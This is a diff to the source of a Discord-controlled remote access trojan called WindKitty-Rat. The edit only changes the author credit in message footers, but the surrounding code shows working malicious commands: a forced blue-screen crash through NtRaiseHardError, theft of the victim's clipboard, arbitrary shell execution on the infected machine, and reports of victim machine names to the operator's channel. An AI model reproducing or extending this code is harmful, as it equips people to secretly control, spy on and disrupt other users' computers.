@@ -274,7 +274,7 @@ async def sns(ctx, t, d):
         f.write('\n'.join(d))
 
     embed = discord.Embed(title=f'{t} File', description=f'Here\'s your {t} file, pookie bear >.<')
-    embed.set_footer(text='WindKitty-Rat made by codepulze.')
+    embed.set_footer(text='WindKitty-Rat made by evilbytecode.')
 
     embed.set_thumbnail(url='https://raw.githubusercontent.com/WindKitty/WindKitty-Rat/main/img/WindKittyLogo.png')
 
@@ -405,7 +405,7 @@ async def help_command(ctx):
     for cmdinf in cmds:
         embed.add_field(name=f'.{cmdinf["name"]}', value=f'{cmdinf["description"]} Example: `{cmdinf["example"]}`', inline=False)
 
-    embed.set_footer(text='WindKitty-Rat made by codepulze.')
+    embed.set_footer(text='WindKitty-Rat made by evilbytecode.')
     embed.set_thumbnail(url='https://raw.githubusercontent.com/WindKitty/WindKitty-Rat/main/img/WindKittyLogo.png')
 
     await ctx.send(embed=embed)
@@ -446,7 +446,7 @@ async def on_ready():
         ratmonitor = discord.Game(f"Rat is connect to over {sumofchannels} Computers")
         await bot.change_presence(activity=ratmonitor)
         embed = discord.Embed(title="WindKitty-Rat", description=f"Connected to: {windkittyuserpcname1}\nYour WindKitty key is: `{key}`", color=discord.Color.blurple())
-        embed.set_footer(text='WindKitty-Rat made by codepulze, use .help for commands.')
+        embed.set_footer(text='WindKitty-Rat made by evilbytecode, use .help for commands.')
         embed.set_thumbnail(url='https://raw.githubusercontent.com/WindKitty/WindKitty-Rat/main/img/WindKittyLogo.png')
         await channel.send(embed=embed)
 
@@ -561,7 +561,7 @@ async def bsod(ctx, key=None):
     rtl_adjust_privilege(19, True, False, t1)
     nt_raise_hard_error(0xc0000022, 0, 0, None, 6, t2)
     embed = discord.Embed(title='BSOD', description='Sucessfully Executed Command.')
-    embed.set_footer(text='WindKitty-Rat made by codepulze.')
+    embed.set_footer(text='WindKitty-Rat made by evilbytecode.')
 
     embed.set_thumbnail(url='https://raw.githubusercontent.com/WindKitty/WindKitty-Rat/main/img/WindKittyLogo.png')
 
@@ -587,7 +587,7 @@ async def catwallpaper(ctx, key=None):
     SPI_SETDESKWALLPAPER, SPIF_SENDCHANGE = 0x0014, 0x02
     ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, tmpcatwallpaper, SPIF_SENDCHANGE)
     embed = discord.Embed(title='Random Cat Wallpaper', description='Sucessfully Executed Command.')
-    embed.set_footer(text='WindKitty-Rat made by codepulze.')
+    embed.set_footer(text='WindKitty-Rat made by evilbytecode.')
 
     embed.set_thumbnail(url='https://raw.githubusercontent.com/WindKitty/WindKitty-Rat/main/img/WindKittyLogo.png')
 
@@ -606,7 +606,7 @@ async def clipboard(ctx, key=None):
         result = subprocess.check_output(['powershell', 'Get-Clipboard'], text=True)
 
         embed = discord.Embed(title='Clipboard Info', description=result)
-        embed.set_footer(text='WindKitty-Rat made by codepulze.')
+        embed.set_footer(text='WindKitty-Rat made by evilbytecode.')
         embed.set_thumbnail(url='https://raw.githubusercontent.com/WindKitty/WindKitty-Rat/main/img/WindKittyLogo.png')
         await ctx.send(embed=embed)
 
@@ -783,7 +783,7 @@ async def shell(ctx, key=None, *, command: str):
         try:
             subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
             embed = discord.Embed(title='Shell Info', description='Executed successfully')
-            embed.set_footer(text='WindKitty-Rat made by codepulze.')
+            embed.set_footer(text='WindKitty-Rat made by evilbytecode.')
             embed.set_thumbnail(url='https://raw.githubusercontent.com/WindKitty/WindKitty-Rat/main/img/WindKittyLogo.png')
             await ctx.send(embed=embed)
         except subprocess.CalledProcessError as e:
